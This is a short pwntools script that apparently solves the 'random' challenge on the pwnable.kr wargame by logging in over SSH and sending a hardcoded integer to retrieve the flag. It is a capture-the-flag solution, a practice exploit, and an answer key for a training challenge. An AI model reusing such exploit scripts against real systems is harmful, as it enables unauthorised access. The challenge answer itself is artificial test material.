from pwn import *

inputInteger = '3039230856'.encode()

server = ssh('random','pwnable.kr',2222,'guest')
proc = server.process('random')
proc.sendline(inputInteger)
flag = proc.recvlinesS(2)
print('\nFLAG: '+flag[1])

